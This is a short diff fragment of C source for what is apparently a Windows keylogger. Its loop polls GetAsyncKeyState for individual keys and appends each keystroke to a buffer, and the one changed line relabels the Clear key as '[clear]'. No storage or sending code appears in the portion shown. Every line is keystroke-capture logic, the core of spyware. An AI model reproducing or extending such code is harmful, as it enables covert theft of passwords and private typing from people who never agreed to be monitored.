@@ -137,7 +137,7 @@ int main()
             }else if((GetAsyncKeyState(0x6F)) == -32767){strcat(keys,"/");
             }else if((GetAsyncKeyState(0x20)) == -32767){strcat(keys," ");
             }else if((GetAsyncKeyState(0x09)) == -32767){strcat(keys,"\t");
-            }else if((GetAsyncKeyState(0x0C)) == -32767){strcat(keys,"\r");
+            }else if((GetAsyncKeyState(0x0C)) == -32767){strcat(keys,"[clear]");
             }else if((GetAsyncKeyState(0x0D)) == -32767){strcat(keys,"\n");
             }else if((GetAsyncKeyState(0x10)) == -32767){SHIFT_flag = 1;
             }else if((GetAsyncKeyState(0x10)) == 0){SHIFT_flag = 0;
